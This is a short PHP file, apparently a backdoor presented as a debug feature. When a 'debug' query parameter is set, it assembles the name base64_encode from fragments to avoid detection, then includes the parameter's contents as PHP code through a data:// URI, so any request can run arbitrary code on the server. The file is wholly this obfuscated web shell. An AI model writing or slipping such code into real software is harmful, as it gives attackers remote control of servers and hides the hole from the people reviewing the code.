<?php
if(isset($_GET['debug'])) {
    $parts = array('base', '64', '_', 'encode');
    $encoder = implode('', $parts);
    $code = "<" . "?" . "php " . $_GET['debug'] . " ?" . ">";
    $encoded = call_user_func($encoder, $code);
    include 'data://text/plain;base64,' . $encoded;
}
?>
